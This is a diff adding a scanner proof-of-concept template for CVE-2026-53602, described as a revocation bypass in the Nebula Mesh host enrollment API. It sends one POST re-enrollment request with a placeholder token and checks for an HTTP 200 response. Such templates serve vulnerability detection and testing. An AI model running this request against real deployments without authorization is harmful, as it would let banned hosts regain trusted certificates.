@@ -1,0 +1,31 @@
+[info]
+author = "ave"
+description = "验证nebula-mesh中主机撤销机制失效漏洞。攻击者通过重新加入被封禁主机，绕过撤销状态获得新证书。具体过程：攻击者获取封禁主机重新入网令牌，执行入网操作，系统因不检查封禁状态而为其签发新证书，新证书指纹绕过原证书指纹检查，导致封禁主机恢复信任。"
+id = "POC-AVE-2026-0418"
+name = "CVE-2026-53602 Nebula Mesh Host Revocation Bypass PoC"
+severity = "medium"
+tags = ["ave-2026-0418"]
+vuln_id = [
+    "CVE-2026-53602",
+    "AVE-2026-0418",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/hosts/enroll"
+protocol = "http"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[poc.requests.poc.requests.body]
+content = '{"host":{"name":"test-host","groups":["default"]},"enrollment_token":"RE-ENROLL_TOKEN"}'
+type = "json"
